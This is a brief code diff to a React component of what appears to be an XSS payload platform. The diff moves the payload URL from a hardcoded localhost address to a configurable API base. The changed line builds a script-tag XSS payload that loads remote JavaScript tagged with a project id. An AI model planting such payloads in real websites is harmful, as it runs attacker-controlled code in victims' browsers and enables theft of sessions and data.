@@ -3,6 +3,7 @@ import { Card, Badge, Button, Loading, Input } from './ui';
 import { useAuth } from '../contexts/AuthContext';
 import SessionList from './SessionList';
 import projectService from '../services/project';
+import { API_BASE_URL } from '../constants/api';
 import './ProjectDetail.css';
 
 const ProjectDetail = ({ 
@@ -23,7 +24,7 @@ const ProjectDetail = ({
     
     setIsLoading(true);
     try {
-      const payloadScript = `<script src="http://localhost:8088/xss.js?project=${project.jid}"></script>`;
+      const payloadScript = `<script src="${API_BASE_URL}/xss.js?project=${project.jid}"></script>`;
       setPayload(payloadScript);
     } catch (error) {
       console.error('获取载荷失败:', error);
